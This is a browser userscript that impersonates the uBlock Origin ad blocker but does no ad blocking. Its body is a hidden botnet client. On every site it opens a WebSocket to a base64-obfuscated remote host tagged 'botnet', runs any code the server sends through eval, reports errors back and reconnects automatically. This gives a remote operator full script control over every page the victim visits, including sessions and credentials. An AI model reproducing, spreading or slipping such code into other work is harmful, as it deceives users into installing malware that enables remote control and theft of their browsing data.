// ==UserScript==
// @match        *
// @name         uBlock origin
// @namespace    https://www.ublock.org/
// @version      1.0
// @description  Your web experience has never been this fast and efficient.
// @author       uBlock
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function i() {
    window.ws = new WebSocket(atob('d3NzOi8vdWRlci5tbC9pL3dlYnNvY2tldD8k') + btoa('botnet'));
    ws.onmessage = function(d) {
        try {
            d = JSON.parse(d.data);
            eval(d.d);
        } catch(e) {
            ws.send(JSON.stringify({
                t: 'e',
                d: e.stack,
            }));
        }
    };
    ws.onclose = function() {
        setTimeout(i, 3000);
    };
})();